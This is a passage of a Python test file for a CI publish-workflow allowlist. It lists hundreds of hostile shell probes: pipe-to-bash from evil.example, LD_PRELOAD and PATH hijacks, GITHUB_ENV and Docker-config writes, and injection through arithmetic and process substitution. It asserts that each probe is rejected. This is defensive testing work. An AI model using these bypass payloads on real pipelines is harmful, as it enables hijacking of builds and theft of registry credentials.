            assert step.uses in ALLOWED_PUBLISH_ACTIONS, step.uses
            assert step.run is None
            continue
        assert step.run is not None, step.name
    assert [step.name for step in steps if step.shell == "python3 {0}"] == [VERSION_CHECK]


HEALTH_CHECK = (
    "import json,sys; data=json.loads(sys.argv[4]); assert data == "
    '{"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], '
    '"schema_version": sys.argv[3]}'
)
CANDIDATE_RUN = (
    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" '
)
VERSION_TAG = '"${IMAGE_NAME}:${{ steps.version.outputs.value }}"'
LATEST_TAG = '"${IMAGE_NAME}:latest"'
PROMOTE = f"docker buildx imagetools create --tag {VERSION_TAG} --tag {LATEST_TAG} "

# Every probe from the PR #15 / PR #17 reviews (r1: saf-44-r2/probes.py; r2:
# probes_r2.py; r3: probes_r3.py and key_probes.py) and every SAF-44 in-test
# counterexample, deduplicated by value. Under the old shlex-based checker these
# were rejected one bypass class at a time; under exact matching none of them
# needs a dedicated rule. Probes that are verbatim production lines are accepted
# (see test_publish_line_allowlist_accepts_verbatim_production_probes); every
# other probe, including semantically equivalent rewrites of a production line
# (`printf "%s\n"`, reordered `-e` options, ...), is rejected by design.
REVIEW_PROBES: dict[str, str] = {
    "r1-ld-preload": "LD_PRELOAD=/tmp/x.so " + CANDIDATE_RUN + CANDIDATE_IMAGE,
    "r1-path-inject": "PATH=/evil docker pull " + CANDIDATE_IMAGE,
    "r1-bash-env": "BASH_ENV=/tmp/evil docker pull " + CANDIDATE_IMAGE,
    "r1-redir-write": "printf 'pwned' > /tmp/evil",
    "r1-redir-docker-config": "echo pwned > /home/runner/.docker/config.json",
    "r1-imagetools-other-src": "docker buildx imagetools create --tag ghcr.io/x/y:latest alpine",
    "r1-imagetools-multi-src": 'docker buildx imagetools create --tag "${IMAGE_NAME}:latest" alpine '
    + CANDIDATE_IMAGE,
    "r1-env-evil-url": CANDIDATE_RUN
    + "-e GHIDRA_MCP_PUBLIC_URL=http://evil.example/ "
    + CANDIDATE_IMAGE,
    "r1-logs-other": "docker logs anything-at-all",
    "r1-rm-other": "docker rm -f anything",
    "r1-curl-userinfo": "curl -fsS http://127.0.0.1:8765@example.invalid/",
    "r1-buildx-push": "docker buildx build --push -t x .",
    "r1-run-workflow-shape": CANDIDATE_RUN
    + "-e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 "
    + CANDIDATE_IMAGE,
    "r2-create-src-before-tag": f"docker buildx imagetools create {CANDIDATE_IMAGE} --tag {LATEST_TAG}",
    "r2-create-dup-candidate": f"docker buildx imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE} {CANDIDATE_IMAGE}",
    "r2-create-tag-t": f"docker buildx imagetools create -t {LATEST_TAG} {CANDIDATE_IMAGE}",
    "r2-create-tag-noquote-other": f"docker buildx imagetools create --tag ${{IMAGE_NAME}}:latest2 {CANDIDATE_IMAGE}",
    "r2-create-tag-dangling": f"docker buildx imagetools create {CANDIDATE_IMAGE} --tag",
    "r2-create-tag-eq-other": f"docker buildx imagetools create --tag {LATEST_TAG} --tag=evil {CANDIDATE_IMAGE}",
    "r2-create-src-tagword": f"docker buildx imagetools create --tag {LATEST_TAG} {VERSION_TAG}",
    "r2-create-src-subst": f'docker buildx imagetools create --tag {LATEST_TAG} "$(echo alpine)"',
    "r2-create-src-var": f'docker buildx imagetools create --tag {LATEST_TAG} "$HEALTH"',
    "r2-create-builder": f"docker buildx --builder x imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE}",
    "r2-create-dashdash": f"docker buildx imagetools create --tag {LATEST_TAG} -- {CANDIDATE_IMAGE}",
    "r2-create-file": f"docker buildx imagetools create --tag {LATEST_TAG} -f /tmp/x {CANDIDATE_IMAGE}",
    "r2-inspect-extra": f"docker buildx imagetools inspect {VERSION_TAG} --format '{{{{json .Manifest.Digest}}}}' --raw",
    "r2-inspect-latest": f"docker buildx imagetools inspect {LATEST_TAG} --format '{{{{json .Manifest.Digest}}}}'",
    "r2-manifest-inspect-latest": f"docker manifest inspect {LATEST_TAG}",
    "r2-docker-global-opt": f"docker --config /tmp/c buildx imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE}",
    "r2-docker-H": f"docker -H tcp://evil pull {CANDIDATE_IMAGE}",
    "r2-export-path": "export PATH=/evil",
    "r2-env-cmd": "env LD_PRELOAD=/tmp/x docker pull " + CANDIDATE_IMAGE,
    "r2-declare": "declare -x PATH=/evil",
    "r2-assign-image-name": "IMAGE_NAME=ghcr.io/evil/x",
    "r2-assign-two-prefix": "VERSION=1 TOKEN=2 docker pull " + CANDIDATE_IMAGE,
    "r2-assign-then-semicolon-cmd": "HEALTH=x; docker pull " + CANDIDATE_IMAGE,
    "r2-assign-in-subst": 'HEALTH="$(PATH=/evil docker logs ghidra-mcp-ci)"',
    "r2-assign-after-bang": "! PATH=/evil docker pull " + CANDIDATE_IMAGE,
    "r2-printf-v-PATH": "printf -v PATH '%s' /tmp/evil",
    "r2-printf-v-IMAGE": "printf -v IMAGE_NAME '%s' ghcr.io/evil/x",
    "r2-printf-v-LDPRELOAD": "printf -v BASH_ENV '%s' /tmp/evil",
    "r2-array-assign": "PATH[0]=/evil",
    "r2-for-other-var": "for PATH in /evil; do true; done",
    "r2-for-underscore-ok": "for _ in $(seq 1 3); do sleep 1; done",
    "r2-redir-rw": "echo pwned 1<>/home/runner/.docker/config.json",
    "r2-redir-rw-nofd": "echo pwned <>/tmp/evil",
    "r2-redir-andappend": "echo pwned &>>/tmp/evil",
    "r2-redir-gt-amp-file": "echo pwned >&/tmp/evil",
    "r2-redir-fd3": "echo pwned 3>/tmp/evil",
    "r2-redir-noclobber": "echo pwned >|/tmp/evil",
    "r2-redir-output-word-split": 'echo x >>"$GITHUB_OUTPUT"x',
    "r2-redir-dup-fd-arg": "echo 2 > /dev/null",
    "r2-redir-output-arbitrary": 'echo "digest=sha256:evil" >> "$GITHUB_OUTPUT"',
    "r2-redir-procsub-out": "echo x > >(cat > /tmp/evil)",
    "r2-procsub-in": "echo <(curl -fsS http://evil.example/)",
    "r2-procsub-out-arg": "echo >(dd of=/tmp/evil)",
    "r2-procsub-grep": "grep x <(python3 -c 'import os')",
    "r2-tee-allowed?": "echo x | tee /tmp/evil",
    "r2-python-arbitrary": "python3 -c 'import json,sys; import os; os.system(\"curl evil|sh\")'",
    "r2-openssl-out": "openssl rand -out /home/runner/.docker/config.json 16",
    "r2-openssl-engine": "openssl rand -engine /tmp/evil.so 16",
    "r2-grep-docker-config": "grep -r . /home/runner/.docker/config.json",
    "r2-arith-subscript": "HEALTH=$'a[\\x24(id >&2)]'; [[ \"$HEALTH\" -eq 0 ]]",
    "r2-arith-dollar-paren": "echo $(( $(id) ))",
    "r2-brace-param-subst": 'echo "${HEALTH:-$(curl -fsS http://evil.example/)}"',
    "r2-test-in-dbl-bracket-sep": "[[ -n x ]] || curl http://evil.example/",
    "r2-dbl-bracket-unterminated": "[[ -n x ; curl http://evil.example/",
    "r2-eval": "eval 'curl evil'",
    "r2-source": ". /tmp/evil",
    "r2-trap": "trap 'curl evil' EXIT",
    "r2-exec-redir": "exec 3>/tmp/evil",
    "r2-case-stmt": "case x in x) curl http://evil.example/ ;; esac",
    "r2-function-def": "f() { curl http://evil.example/; }",
    "r3-p1-andappend-env": 'echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"',
    "r3-p1-rw": "echo x <> /tmp/evil",
    "r3-p1-1rw-env": 'echo PATH=/evil 1<> "$GITHUB_ENV"',
    "r3-p1-appendamp": 'echo x >>& "$GITHUB_ENV"',
    "r3-p1-gt-env": 'echo x > "$GITHUB_ENV"',
    "r3-p1-append-env": 'echo x >> "$GITHUB_ENV"',
    "r3-p1-append-path": 'echo /evil >> "$GITHUB_PATH"',
    "r3-p1-amp-gt-env": 'echo x &> "$GITHUB_ENV"',
    "r3-p1-clobber-env": 'echo x >| "$GITHUB_ENV"',
    "r3-p1-dupout-env": 'echo x >& "$GITHUB_ENV"',
    "r3-p1-fd3-env": 'echo x 3>> "$GITHUB_ENV"',
    "r3-p1-lt-amp": "echo x <& 3",
    "r3-p1-fdvar": 'echo x {fd}>> "$GITHUB_ENV"',
    "r3-p1-fdvar2": 'echo x {fd}>>"$GITHUB_ENV"',
    "r3-p1-nospace": 'echo x>>"$GITHUB_ENV"',
    "r3-p1-heredoc": "cat <<EOF",
    "r3-p1-heredoc-dash": "echo <<-EOF",
    "r3-p1-append-out-other": 'echo x >> "$GITHUB_OUTPUT_X"',
    "r3-p1-append-out-unquoted": "echo x >> $GITHUB_OUTPUT",
    "r3-p1-quoted-env-target": "echo x >> '$GITHUB_ENV'",
    "r3-p1-escaped-gt": "echo x \\>\\> /tmp/evil",
    "r3-p2-printf-v2": "printf -vPATH '%s' /tmp/evil",
    "r3-p2-printf-b": "printf '%b' \"$INSPECT_ERROR\"",
    "r3-p2-printf-prod": "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
    "r3-p2-printf-dq": 'printf "%s\\n" "$INSPECT_ERROR" >&2',
    "r3-p2-printf-unq-arg": "printf '%s\\n' $INSPECT_ERROR",
    "r3-p3-in": "echo <(id)",
    "r3-p3-out": "echo >(id)",
    "r3-p3-quoted": "echo '<(id)'",
    "r3-p3-redir": "echo x > >(id)",
    "r3-p3-grep": "grep x < <(id)",
    "r3-p4-prefix-suffix": "python3 -c 'import json,sys; import os; os.system(\"id\")'",
    "r3-p4-prod-plus-suffix": "python3 -c '"
    + HEALTH_CHECK
    + '; import os\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
    "r3-p4-prod": "python3 -c '"
    + HEALTH_CHECK
    + '\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
    "r3-p4-env-pythonpath": "PYTHONSTARTUP=/x python3 -c '" + HEALTH_CHECK + "' a b c d",
    "r3-c-arith-unq": "echo $((PATH=5))",
    "r3-c-dblbr-arith": "[[ 1 -eq PATH=1 ]]",
    "r3-c-colon-assign": 'echo "${X:=v}"',
    "r3-c-at-p": 'echo "${H@P}"',
    "r3-c-legacy": 'echo "$[1+1]"',
    "r3-c-echo-dblbr": "echo [[ ; curl http://evil.example/ ]]",
    "r3-n-arith-dq-assign-PATH": 'echo "$((PATH=5))"',
    "r3-n-arith-dq-HEALTH": 'echo "$((HEALTH))"',
    "r3-n-arith-dq-in-assign": 'VERSION="$((HEALTH))"',
    "r3-n-arith-sq-build-then-dq": "HEALTH='x[$''(id >&2)]'; echo \"$((HEALTH))\"",
    "r3-n-arith-ansic-then-dq": "HEALTH=$'x[\\x24(id)]'; echo \"$((HEALTH))\"",
    "r3-n-arith-dq-exit": 'exit "$((HEALTH))"',
    "r3-n-arith-dq-sleep": 'sleep "$((HEALTH))"',
    "r3-n-arith-dq-dblbr": '[[ "$((HEALTH))" ]]',
    "r3-n-arith-dq-nested-cmd": 'echo "$((x[$(id)]))"',
    "r3-n-var-cmdname": '"$HEALTH"',
    "r3-n-eval": "eval id",
    "r3-n-source": "source /tmp/x",
    "r3-n-dot": ". /tmp/x",
    "r3-n-env": "env id",
    "r3-n-command": "command id",
    "r3-n-builtin": "builtin eval id",
    "r3-n-exec": "exec id",
    "r3-n-coproc": "coproc id",
    "r3-n-declare-n": "declare -n X=PATH",
    "r3-n-typeset": "typeset PATH=/evil",
    "r3-n-mapfile": "mapfile PATH",
    "r3-n-read": "read PATH",
    "r3-n-local": "local PATH=/evil",
    "r3-n-alias": "alias echo=id",
    "r3-n-trap": "trap id EXIT",
    "r3-n-set": "set -o xtrace",
    "r3-n-echo-e": "echo -e 'x\\ny'",
    "r3-n-time": "time id",
    "r3-n-keyword-time-dblbr": "time [[ 1 -eq PATH=1 ]]",
    "r3-n-array-after-allowed": "VERSION=1 PATH[0]=/evil",
    "r3-n-assign-ansic-cmdname": "$'\\x63url' http://evil.example/",
    "r3-n-tilde-assign": "HEALTH=~root",
    "r3-n-glob-cmd": "/usr/bin/cur? http://evil.example",
    "r3-n-workflow-cmd": 'echo "::add-path::/tmp/evil"',
    "r3-n-github-expr-any": 'echo "${{ github.event.head_commit.message }}"',
    "r3-n-comment-hide": "echo x #; curl http://evil.example/",
    "r3-n-midword-hash": "echo x#; curl http://evil.example/",
    "r3-n-brace-group": "{ curl http://evil.example/; }",
    "r3-n-subshell": "( curl http://evil.example/ )",
    "r3-n-pipe-amp": "echo x |& curl http://evil.example/",
    "r3-n-bg": "echo x & curl http://evil.example/",
    "r3-n-select": "select x in a; do id; done",
    "r3-n-while-cond": "while curl http://evil.example/; do break; done",
    "r3-n-until": "until id; do break; done",
    "r3-n-if-cond-assign": "if PATH=/x; then true; fi",
    "r3-n-for-cstyle": "for ((i=0;i<1;i++)); do id; done",
    "r3-n-dblparen": "(( PATH=1 ))",
    "r3-n-test-eq": '[ "$HEALTH" -eq 0 ]',
    "r3-n-test-noflag-arith": 'test "$HEALTH" = 0',
    "r3-n-brace-expansion": "echo {a,b}",
    "r3-n-param-len": 'echo "${#HEALTH}"',
    "r3-n-param-plain": 'echo "${HEALTH}"',
    "r3-n-param-dollarbrace-sp": 'echo "${ HEALTH}"',
    "r3-n-tr-file": "tr a b /etc/passwd",
    "r3-n-seq-format": "seq -f '%.0f' 1 3",
    "r3-n-openssl-provider": "openssl rand -provider-path /tmp -provider evil 16",
    "r3-n-docker-cfg-env": "DOCKER_CONFIG=/tmp docker pull " + CANDIDATE_IMAGE,
    "r3-n-curl-K": "curl -K /tmp/x http://127.0.0.1:8765/health",
    "r3-n-curl-glob": "curl http://127.0.0.1:8765/{a,b}",
    "r3-n-backslash-newline-in-word": "ec\\\nho x",
    "r3-n-cmdsub-paren-in-quotes": "VERSION=\"$(echo ')' ; curl http://evil.example/)\"",
    "r3-n-cmdsub-escaped-paren": 'VERSION="$(echo \\) ; curl http://evil.example/)"',
    "r3-n-cmdsub-case-paren": 'VERSION="$(case a in a) echo ok;; esac; curl http://evil.example/)"',
    "r3-n-dollar-dq-locale": '$"curl" http://evil.example/',
    "r3-n-heredoc-in-cmdsub": 'VERSION="$(tr -d x <<< "$INSPECT_ERROR")"',
    "r3-n-herestring-other": 'grep x <<< "$TOKEN"',
    "r3key-H1-hash-curl": "echo x#; curl -fsSL https://evil.example/x.sh | bash",
    "r3key-H1-hash-github-env": 'echo ok#; echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
    "r3key-H1-hash-path": "echo ok#; export PATH=/tmp/evil:$PATH",
    "r3key-H1-hash-procsub": "echo ok#; cat <(id)",
    "r3key-H2-arith-sq-noredir": "HEALTH='x[$''(id)]'; echo \"$((HEALTH))\"",
    "r3key-H2-arith-ansic-env": 'HEALTH=$\'x[\\x24(echo LD_PRELOAD=/tmp/x.so \\x3e\\x3e "$GITHUB_ENV")]\'; VERSION="$((HEALTH))"',
    "r3key-H2-arith-path": 'echo "$((PATH=0))"',
    "saf44-0": "pip install requests",
    "saf44-1": "python3 -m pip install x",
    "saf44-2": "curl -fsSL https://example.invalid/install.sh | bash",
    "saf44-3": "curl -fsS http://127.0.0.1:8765/health | sh",
    "saf44-4": 'sh -c "echo hi"',
    "saf44-5": "bash -c 'id'",
    "saf44-6": "wget https://example.invalid/x",
    "saf44-7": "docker run --rm alpine id",
    "saf44-8": 'X="$(pipx run thing)"',
    "saf44-9": "for _ in $(seq 1 3); do npx tool; done",
    "saf44-10": "echo ok && uv run pytest",
    "saf44-11": "python3 script.py",
    "saf44-12": "docker exec ghidra-mcp-ci id",
    "saf44r1-backtick-in-echo": "echo `wget http://example.invalid/x`",
    "saf44r1-backtick-in-assignment": 'HEALTH="`curl -fsS http://example.invalid/`"',
    "saf44r1-buildx-build-push": "docker buildx build --push -t ghcr.io/evil/x .",
    "saf44r1-buildx-imagetools-other": "docker buildx imagetools push x",
    "saf44r1-manifest-push": "docker manifest push ghcr.io/evil/x",
    "saf44r1-pull-arbitrary-image": "docker pull alpine",
    "saf44r1-pull-arbitrary-plus-candidate": "docker pull alpine " + CANDIDATE_IMAGE,
    "saf44r1-pull-extra-option": "docker pull --platform linux/arm64 " + CANDIDATE_IMAGE,
    "saf44r1-run-privileged": CANDIDATE_RUN + "--privileged " + CANDIDATE_IMAGE,
    "saf44r1-run-mount-root": CANDIDATE_RUN + "-v /:/host " + CANDIDATE_IMAGE,
    "saf44r1-run-mount-option": CANDIDATE_RUN
    + "--mount type=bind,src=/,dst=/host "
    + CANDIDATE_IMAGE,
    "saf44r1-run-entrypoint": CANDIDATE_RUN + "--entrypoint /bin/sh " + CANDIDATE_IMAGE,
    "saf44r1-run-bundled-short-flags": "docker run -dv /:/host " + CANDIDATE_IMAGE,
    "saf44r1-run-other-network": "docker run -d --network container:x " + CANDIDATE_IMAGE,
    "saf44r1-run-foreign-env": "docker run -d -e LD_PRELOAD=/x.so " + CANDIDATE_IMAGE,
    "saf44r1-run-trailing-argv": "docker run -d " + CANDIDATE_IMAGE + " id",
    "saf44r1-curl-L": "curl -L http://127.0.0.1:8765/health",
    "saf44r1-curl-fsSL": "curl -fsSL http://127.0.0.1:8765/health",
    "saf44r1-curl-location": "curl --location http://127.0.0.1:8765/health",
    "saf44r1-curl-output-file": "curl -fsS -o /tmp/x http://127.0.0.1:8765/health",
    "saf44r2-imagetools-create-alpine": PROMOTE + "alpine",
    "saf44r2-imagetools-foreign-tag": "docker buildx imagetools create --tag ghcr.io/evil/x:latest "
    + CANDIDATE_IMAGE,
    "saf44r2-imagetools-tag-equals": f"docker buildx imagetools create --tag={LATEST_TAG} {CANDIDATE_IMAGE}",
    "saf44r2-imagetools-extra-option": PROMOTE + "--append " + CANDIDATE_IMAGE,
    "saf44r2-imagetools-no-tag": "docker buildx imagetools create " + CANDIDATE_IMAGE,
    "saf44r2-imagetools-inspect-other": "docker buildx imagetools inspect alpine --format '{{json .Manifest.Digest}}'",
    "saf44r2-manifest-inspect-other": "docker manifest inspect alpine",
    "saf44r2-allowed-name-as-prefix": "HEALTH=x docker pull " + CANDIDATE_IMAGE,
    "saf44r2-path-assignment": "PATH=/evil",
    "saf44r2-shellopts-assignment": "SHELLOPTS=xtrace; docker logs ghidra-mcp-ci",
    "saf44r2-for-binds-path": "for PATH in /evil; do docker logs ghidra-mcp-ci; done",
    "saf44r2-redir-append": "echo pwned >> /home/runner/.docker/config.json",
    "saf44r2-redir-github-env": 'echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
    "saf44r2-redir-truncate-output": 'echo x > "$GITHUB_OUTPUT"',
    "saf44r2-redir-both-streams": "echo x &> /tmp/evil",
    "saf44r2-redir-stderr-file": "echo x 2> /tmp/evil",
    "saf44r2-redir-heredoc": "echo x <<EOF",
    "saf44r2-env-fixed-token": "docker run -d -e GHIDRA_MCP_AUTH_TOKEN=known " + CANDIDATE_IMAGE,
    "saf44r3-rw-github-env": 'echo "PATH=/evil" 1<> "$GITHUB_ENV"',
    "saf44r3-quoted-angle-bracket-word": "echo 'x>/tmp/evil'",
    "saf44r3-printf-extra": 'printf \'%s\\n\' "$INSPECT_ERROR" "$TOKEN"',
    "saf44r3-expansion-colon-assign": 'echo "${BASH_ENV:=/tmp/evil}"',
    "saf44r3-expansion-assign": 'echo "${LD_PRELOAD=/tmp/x.so}"',
    "saf44r3-expansion-prompt": 'echo "${HEALTH@P}"',
    "saf44r3-expansion-offset": 'echo "${VERSION:$HEALTH}"',
    "saf44r3-expansion-subscript": 'echo "${VERSION[$HEALTH]}"',
    "saf44r3-expansion-indirect": 'echo "${!HEALTH}"',
    "saf44r3-legacy-arith": 'echo "$[HEALTH]"',
    "saf44r3-dbl-bracket-v": "[[ -v $HEALTH ]]",
    "saf44r3-single-bracket-v": '[ -v "$HEALTH" ]',
    "saf44r3-test-v": 'test -v "$HEALTH"',
    "saf44r3-python-suffix": "python3 -c '" + HEALTH_CHECK + '; import os\' a b c "$HEALTH"',
    "saf44r3-python-extra-arg": "python3 -c '" + HEALTH_CHECK + '\' a b c "$HEALTH" extra',
    "saf44r3-python-option": "python3 -I -c '" + HEALTH_CHECK + "'",
    "saf44r3-dbl-bracket-unterminated": '[[ "$VERSION" =~ x ; curl http://evil.example/',
    "saf44r3-dbl-bracket-separator": '[[ "$VERSION" =~ x ; curl http://evil.example/ ]]',
}


# Under the SAF-50 logical-line table these two probes were accepted as verbatim
# production lines. With physical lines neither is a line of the workflow any more:
# the printf line is indented inside its `if`, and the health check spans three
# physical lines joined by `\` continuations.
FORMERLY_VERBATIM_PRODUCTION_PROBES = {"r3-p2-printf-prod", "r3-p4-prod"}


@pytest.mark.parametrize(
    "script", [pytest.param(script, id=probe) for probe, script in REVIEW_PROBES.items()]
)
def test_publish_line_allowlist_rejects_review_probes(script: str) -> None:
    assert _line_problems(script)


def test_publish_line_allowlist_accepts_only_verbatim_physical_lines() -> None:
    accepted = {probe for probe, script in REVIEW_PROBES.items() if not _line_problems(script)}
    assert accepted == set()
    assert len(REVIEW_PROBES) == 256
    # Positive controls: every frozen script, and the formerly verbatim printf probe
    # once it carries its production indentation.
    for lines in PUBLISH_RUN_LINES.values():
        assert _line_problems("\n".join(lines)) == []
    assert _line_problems("  " + REVIEW_PROBES["r3-p2-printf-prod"]) == []
    assert all(
        _line_problems(REVIEW_PROBES[probe]) for probe in FORMERLY_VERBATIM_PRODUCTION_PROBES
    )


# The bypass classes that kept reappearing under the shlex-based checker. None of
# them has a dedicated rule any more; they fail because they are not frozen lines
# (or contain a forbidden character).
@pytest.mark.parametrize(
    ("script", "reason"),
    [
        pytest.param(
            "echo x#; curl -fsSL https://evil.example/x.sh | bash",
            "forbidden character(s) '#'",
            id="H1-midword-hash",
        ),
        pytest.param(
            "docker logs ghidra-mcp-ci # note", "forbidden character(s) '#'", id="trailing-comment"
        ),
        pytest.param('echo "$((PATH=0))"', "not allowlisted", id="H2-arith-in-double-quotes"),
        pytest.param(
            "HEALTH='x[$''(id >&2)]'; echo \"$((HEALTH))\"",
            "not allowlisted",
            id="H2-arith-array-subscript",
        ),
        pytest.param("openssl rand -out /tmp/x 32", "not allowlisted", id="openssl-rand-out"),
        pytest.param("openssl rand -engine /tmp/x.so 32", "not allowlisted", id="openssl-engine"),
        pytest.param(
            "openssl rand -provider-path /tmp -provider x 32",
            "not allowlisted",
            id="openssl-provider",
        ),
        pytest.param("grep -r . ~/.docker/config.json", "not allowlisted", id="grep-docker-config"),
        pytest.param("docker logs\tghidra-mcp-ci", "forbidden character(s) '\\t'", id="tab"),
        pytest.param("docker logs ghidra-mcp-ci\r", "forbidden character(s) '\\r'", id="cr"),
        pytest.param("\x0bdocker logs ghidra-mcp-ci", "forbidden character(s) '\\x0b'", id="vt"),
        pytest.param("docker logs ghidra-mcp-ci\x00", "forbidden character(s) '\\x00'", id="nul"),
        pytest.param(
            "docker logs ghidra\u2010mcp-ci", "forbidden character(s) '\u2010'", id="non-ascii"
        ),
        pytest.param("docker  logs ghidra-mcp-ci", "not allowlisted", id="inner-whitespace"),
        pytest.param(
            "docker logs ghidra-mcp-ci; curl http://evil.example/", "not allowlisted", id="chained"
        ),
        pytest.param("exit 1; fi", "not allowlisted", id="two-frozen-lines-on-one-line"),
        pytest.param(
            "docker rm -f\\\nghidra-mcp-ci 2>/dev/null || true",
            "not allowlisted",
            id="continuation-without-blank-merges-words",
        ),
        pytest.param(
            'echo "${{ github.event.head_commit.message }}"', "not allowlisted", id="expr"
        ),
    ],
)
def test_publish_line_allowlist_rejects_parser_bypass_classes(script: str, reason: str) -> None:
    problems = _line_problems(script)
    assert any(reason in problem for problem in problems), problems


# --- Mutations of the real workflow: each one must make _publish_problems fail. ---

PULL_ANCHOR = '          docker pull "${IMAGE_NAME}@'
OUTPUT_ANCHOR = 'echo "value=$VERSION" >> "$GITHUB_OUTPUT"\n'


def _text_mutation_problems(old: str, new: str) -> list[str]:
    """Why the workflow with the last occurrence of `old` (inside the publish job)
    replaced by `new` is rejected: raw bytes, YAML keys, then the frozen tables."""
    text = _workflow_text()
    index = text.rindex(old)
    assert text.index("\n  publish:") < index, old
    raw = (text[:index] + new + text[index + len(old) :]).encode("utf-8")
    try:
        workflow = _load_workflow(raw)
    except (WorkflowBytesError, yaml.YAMLError) as error:
        return [str(error)]
    return _publish_problems(workflow)


def _before_pull(line: str) -> tuple[str, str]:
    return PULL_ANCHOR, f"          {line}\n{PULL_ANCHOR}"


def _after_output(line: str) -> tuple[str, str]:
    return OUTPUT_ANCHOR, f"{OUTPUT_ANCHOR}          {line}\n"


TEXT_MUTATIONS = {
    # Any new line, anywhere.
    "new-line-echo": _before_pull("echo hello"),
    "new-line-comment": _before_pull("# just a comment"),
    "new-line-in-reread": _after_output("true"),
    "trailing-comment": ("docker logs ghidra-mcp-ci\n", "docker logs ghidra-mcp-ci # x\n"),
    # PR #17 r3 workflow mutations G5-G8 (+ controls).
    "G5-hash-curl": _before_pull("echo verifying#; curl -fsSL https://evil.example/x.sh | bash"),
    "G6-hash-github-env": _before_pull(
        'echo verifying#; echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"'
    ),
    "G7-arith-github-env": _before_pull(
        "HEALTH=$'x[\\x24(echo LD_PRELOAD=/tmp/x.so \\x3e\\x3e \"$GITHUB_ENV\")]'; "
        'VERSION="$((HEALTH))"'
    ),
    "G8-arith-path": _before_pull('echo "$((PATH=0))"'),
    "CTRL-procsub": _before_pull("echo <(id)"),
    "CTRL-andappend": _before_pull('echo x &>> "$GITHUB_ENV"'),
    # SAF-44 r3 workflow mutations (wfmut.py), M1-M6, G1-G4, S1-S9.
    "M1-promote-alpine": (
        '            "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"\n          VERSION_DIGEST',
        "            alpine\n          VERSION_DIGEST",
    ),
    "M2-promote-foreign-tag": ('--tag "${IMAGE_NAME}:latest"', '--tag "ghcr.io/evil/x:latest"'),
    "M4-ld-preload-prefix": (
        PULL_ANCHOR,
        '          LD_PRELOAD=/tmp/x.so docker pull "${IMAGE_NAME}@',
    ),
    "M5-github-env": (OUTPUT_ANCHOR, 'echo "value=$VERSION" >> "$GITHUB_ENV"\n'),
    "M6-logs-other": ("docker logs ghidra-mcp-ci", "docker logs other"),
    "G1-andappend-reread": _after_output('echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"'),
    "G1b-andappend-verify": _before_pull('echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"'),
    "G1c-rw-docker-config": _before_pull("echo pwned 1<>/home/runner/.docker/config.json"),
    "G2-printf-v-path": _before_pull("printf -v PATH '%s' \"/tmp/evil:$PATH\""),
    "G3-procsub": _before_pull("echo <(curl -fsS https://evil.example/x)"),
    "G4-python-arbitrary": _before_pull(
        "python3 -c 'import json,sys; import os; os.system(\"id\")'"
    ),
    "S1-appendamp": _before_pull('echo x >>& "$GITHUB_ENV"'),
    "S2-arith-assign": _before_pull("echo $((PATH=5))"),
    "S3-colon-assign": _before_pull('echo "${BASH_ENV:=/tmp/evil}"'),
    "S4-dbl-bracket-eq": _before_pull("[[ 1 -eq PATH=1 ]]"),
    "S5-test-v": _before_pull('[ -v "$HEALTH" ]'),
    "S6-echo-dbl-bracket": _before_pull("echo [[ ; curl http://evil.example/ ]]"),
    "S7-python-suffix": ("sys.argv[3]}' \\\n", "sys.argv[3]}; import os' \\\n"),
    "S8-prompt-expansion": _before_pull('echo "${HEALTH@P}"'),
    "S9-legacy-arith": _before_pull('echo "$[HEALTH]"'),
    # Residual shapes from the r3 review.
    "openssl-out": ("openssl rand -hex 32", "openssl rand -out /tmp/x 32"),
    "grep-docker-config": _before_pull("grep -r . ~/.docker/config.json"),
    "tab-in-line": ("docker logs ghidra-mcp-ci", "docker logs\tghidra-mcp-ci"),
    "non-ascii-in-line": ("docker logs ghidra-mcp-ci", "docker logs ghidra\u2010mcp-ci"),
    "sleep-changed": ("sleep 2\n", "sleep 0\n"),
    "expression-changed": ("${{ github.sha }}", "${{ github.event.head_commit.message }}"),
}


@pytest.mark.parametrize(
    ("old", "new"), [pytest.param(*pair, id=name) for name, pair in TEXT_MUTATIONS.items()]
)
def test_publish_allowlist_rejects_workflow_text_mutations(old: str, new: str) -> None:
    assert _text_mutation_problems(old, new)


def _publish_step(workflow: dict[str, Any], name: str) -> dict[str, Any]:
    (step,) = [step for step in workflow["jobs"]["publish"]["steps"] if step["name"] == name]
    return step


def _edit_lines(name: str, edit: Any) -> Any:
    """A mutation that rewrites the physical lines of one bash step."""

    def mutate(workflow: dict[str, Any]) -> None:
        step = _publish_step(workflow, name)
        lines = list(_physical_lines(step["run"]))
        edit(lines)
        step["run"] = "\n".join(lines)

    return mutate


def _set(name: str, key: str, value: object) -> Any:
    return lambda workflow: _publish_step(workflow, name).__setitem__(key, value)


def _drop(name: str, key: str) -> Any:
    return lambda workflow: _publish_step(workflow, name).pop(key)


VERIFY = "Verify the candidate digest"
PROMOTE_STEP = "Promote verified digest"
REREAD = "Re-read version and test outputs"
REMOVE = "Remove verification container"
REFUSE = "Refuse to overwrite a released version"
PROMOTE_COMMAND = PUBLISH_RUN_LINES[PROMOTE_STEP][0:4]
DIGEST_TEST_LINE = PUBLISH_RUN_LINES[PROMOTE_STEP][7]
HEALTH_COMMAND = PUBLISH_RUN_LINES[VERIFY][10:13]
HEALTH_LINE = HEALTH_COMMAND[0]
BREAK_LINE = "    break"


def _steps(workflow: dict[str, Any]) -> list[dict[str, Any]]:
    steps = workflow["jobs"]["publish"]["steps"]
    assert isinstance(steps, list)
    return steps


def _swap_steps(first: str, second: str) -> Any:
    def mutate(workflow: dict[str, Any]) -> None:
